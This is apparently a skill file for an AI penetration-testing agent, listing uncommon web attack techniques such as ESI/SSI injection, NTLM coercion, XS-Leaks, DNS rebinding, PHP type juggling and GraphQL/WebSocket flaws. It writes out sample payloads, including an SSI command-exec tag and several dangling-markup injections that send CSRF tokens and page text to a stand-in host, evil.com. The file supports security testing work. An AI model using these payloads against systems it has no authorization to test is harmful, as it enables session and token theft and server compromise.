---
name: deep-cut-surfaces
description: HackTricks-level deep-cut techniques not covered by the mainstream vuln-class skills -- ESI/SSI injection, NTLM relay/coercion, SMTP header injection, JSONP hijacking, XS-Leak timing oracles, tabnabbing, DNS rebinding, exposed management interfaces (JMX/Druid/Kafka admin), ORM error leaks, API schema enumeration via error hints (PostgREST/Supabase, Zod/FastAPI), PHP type juggling, insecure randomness, GWT RPC, Java RMI, and deeper GraphQL/WebSocket issues. Converted from master-pentest-prompt.md Phase 23. Use as a secondary pass after the mainstream vuln classes are covered, or when the target's stack specifically suggests one of these (e.g. a CDN in front suggests checking ESI).
---

# Missing deep-cut surfaces (HackTricks-level)

## When to use

After the mainstream vuln-class skills are covered, or when a specific
signal points here directly -- a CDN/edge-cache provider suggests
checking ESI injection, an internal Windows-adjacent auth flow suggests
NTLM, a contact form suggests SMTP header injection.

## Edge / include injection

- **ESI injection** (Edge Side Includes): `<esi:include src="//evil/x">`
  can achieve internal SSRF or cache poisoning on Akamai/Fastly/Varnish
  deployments that process ESI tags.
- **SSI injection** (Server Side Includes): `<!--#exec cmd="id"-->` in an
  uploaded file processed by Apache `mod_ssi` (commonly `.shtml`).

## Mail and auth protocol

- **SMTP header injection**: a contact form vulnerable to
  `%0d%0aBcc:` can become an open spam relay.
- **NTLM / Integrated Windows Auth**: HTTP-based NTLM coercion
  (Responder, PrinterBug/PetitPotam delivered over HTTP to capture NTLM
  hashes), NTLM relay to an HTTP target.

## Client-side / browser-trust issues

- **JSONP hijacking**: legacy `callback=` endpoints that leak
  authenticated user data cross-origin, since JSONP responses are just
  executable JS the requesting origin can read.
- **Content spoofing / HTML injection**: phishing without needing actual
  script execution.
- **XS-Leak**: cross-site timing/cache/oracle leaks (`window.length`,
  favicon cache behavior, media `error` events) used to confirm the
  existence of a resource the attacker shouldn't be able to see directly.
  Additional variants worth probing beyond the basic timing oracle:
  navigation-detection leaks (did a cross-origin redirect/navigation
  happen at all), cache-probing (was a sub-resource previously cached,
  revealing prior visits/state), DOM `id`-attribute collisions leaking
  whether a fragment exists, `postMessage` broadcasts picked up by a
  listening cross-origin frame, and abusing CORB/CORP enforcement
  differences as a yes/no oracle on resource type or existence. Timing
  oracles themselves split into clock-based, network-timing,
  JS-execution-timing, hybrid, and connection-pool-exhaustion variants.
  For an XS-Search oracle, drive it like a binary-search: fix a
  known-hit query, vary one character/parameter at a time, and use the
  hit/miss signal to walk out the full secret value.
- **Tabnabbing**: `target="_blank"` without `rel="noopener"` lets the
  opened page control/hijack the opener tab.
- **DNS rebinding**: pin a benign IP that passes an SSRF allowlist check,
  then rebind the same hostname to an internal IP for the actual request.
- **HTML scriptless / dangling markup injection**: when HTML injection
  can't be escalated to full XSS (tag/attribute filtering, CSP), an
  unclosed tag can still "swallow" following markup up to the next
  matching closer and leak its text or redirect its targets:
  - an injected `<button formaction=//evil.com>` or
    `<select><option>` consumes all markup up to the next closing
    `</button>`/`</select>`, exfiltrating it to the attacker's
    `formaction`/action on submit;
  - an injected `<style>@import //evil.com?` consumes markup up to the
    next `;`, and an injected `<noscript>` consumes up to the next
    `</noscript>` — both usable to steal nearby secrets;
  - `<base target='...'>` can redirect `window.name` capture, letting an
    attacker read the leaked text cross-domain after the victim clicks
    an unrelated outbound link;
  - an injected `<img src='//evil.com/log?` or (when `img` is blocked by
    CSP) `<meta http-equiv="refresh" content="0;URL='//evil.com/log?`
    exfiltrates everything between the injection point and the next
    quote in the page source — useful for stealing CSRF tokens or other
    inline secrets;
  - an injected `<base href='//evil.com/'>` rewrites all relative form
    actions on the page to the attacker's domain, and injecting a
    second `<form action='//evil.com/log'>` ahead of a legitimate form
    hijacks that form's submission by overriding its action before the
    parser reaches it;
  - injecting hidden `<input>` fields ahead of an existing form (form
    parameter injection) adds attacker-controlled values that get
    submitted alongside the legitimate fields, since the original form
    tag is parsed as content rather than a new form boundary;
  - some of these dangling-markup primitives can bypass a CSP that only
    blocks script execution, provided the exfiltration relies on
    markup/CSS parsing and some user interaction rather than JS.
- **Headless browser abuse** (PhantomJS-style server-side rendering):
  URL parameter injection, SSRF, local file read through the rendering
  service.

## Server-side misconfiguration

- **External variable modification**: injection into environment
  variables or headers that get trusted and used later in the request
  lifecycle.
- **Insecure management interfaces**: exposed JConsole, JMX over RMI,
  Druid's admin console, Spring Boot Actuator `env`/`heapdump` endpoints,
  Kafka or Redis admin UIs left reachable.
- **Insecure source code management**: `.git`/`.svn`/`.hg` exposure (see
  the `information-disclosure` skill), misconfigured AWS CodeCommit
  access, an exposed SonarQube instance.
- **Virtual host enumeration**: fuzz for vhosts with a dedicated wordlist
  -- a vhost not linked from anywhere can carry weaker auth.
- **ORM leak**: Hibernate/TypeORM-style error messages that leak raw SQL
  or schema details.
- **Type juggling** (PHP-specific): loose comparison (`==` vs. `===`),
  `"0e123"`-style magic hash collisions, MD5 collision arrays
  (`password[]=` bypass), `0 == "abc"` evaluating true under loose
  comparison.
- **Insecure randomness**: predictable tokens/OTPs/secrets from a
  time-based or otherwise guessable seed, weak UUIDv1 (embeds a MAC
  address), poor PRNG seeding generally.
- **Incomplete trailing-escape-sequence DoS**: a field that accepts and
  stores a string ending in a dangling escape character (e.g. a lone
  trailing `%` with no following hex digits) because input validation
  only runs on write, not on read. A later shared/bulk-read endpoint
  that tries to unescape/parse the stored value for every user can
  throw an unhandled parser error and 500, denying service to everyone
  whose data is returned in that same response — worth trying on any
  freeform field (name, bio, address) feeding a listing/export API.

## API schema enumeration via error messages

- **PostgREST/Supabase error-hint enumeration**: querying a non-existent
  table on a PostgREST-backed API (Supabase's `/rest/v1/<table>`) returns a
  `hint` field naming the real table -- `{"hint":"Perhaps you meant the
  table 'public.user_sessions'"}` -- turning a single fuzzed request per
  guess into full schema disclosure, no valid auth or successful query
  needed.
- **Zod/FastAPI validation-error schema mining**: POSTing an empty or
  malformed body to a typed API and reading the validation error response
  reconstructs the entire expected request schema, including fields never
  shown in documented examples -- FastAPI's `422` `detail` array lists
  every missing/invalid field by name and type, and a Zod-backed
  Next.js/Node route's `ZodError` message embeds the same for each `path`.

## JSON parsing quirks

- **JSON-based CSRF via content-type bypass**: a JSON API that only
  checks `Content-Type` and not an anti-CSRF token can still be reached
  cross-site by submitting an HTML `<form enctype="application/json">`
  (or `text/plain`) whose single hidden input's *name* is the entire
  target JSON body — the browser sends it as the raw POST body, so the
  server still sees valid JSON despite the request coming from a
  cross-origin auto-submitting form.
- **Cross-service JSON parser differentials**: when the same JSON
  document is parsed by more than one microservice/library in the
  request path (e.g. a gateway validates, a backend acts), look for
  disagreement between parsers on: which value wins for duplicate keys
  in the same object, truncation/comment-stripping quirks that silently
  drop or merge keys, differing float-vs-integer/number-precision
  handling, serialization round-trip quirks, and generally over-permissive
  parsing (trailing commas, comments, NaN/Infinity) accepted by one
  parser but not the other. Any of these can let a value that looks
  benign to the validating parser be interpreted differently — and
  maliciously — by the parser that actually acts on it.

## Less-common RPC/API surfaces

- **Google Web Toolkit (GWT) RPC**: IDOR, auth bypass, and service
  injection in GWT's serialized RPC format.
- **Java RMI**: an exposed RMI registry (port 1099) can allow remote
  class loading.
- **GraphQL** (deeper cuts beyond the basics in `access-control-and-idor`):
  introspection queries, batching brute-force, alias-based IDOR, query
  depth for DoS, field-suggestion schema leakage, and GET-based
  introspection responses ending up cached where they shouldn't be.
- **WebSockets**: no authentication on the socket, cross-site WebSocket
  hijacking, subprotocol injection, `ws://` downgrade from `wss://`, and
  message deserialization where the client sends a serialized object the
  server deserializes unsafely (a potential RCE path).
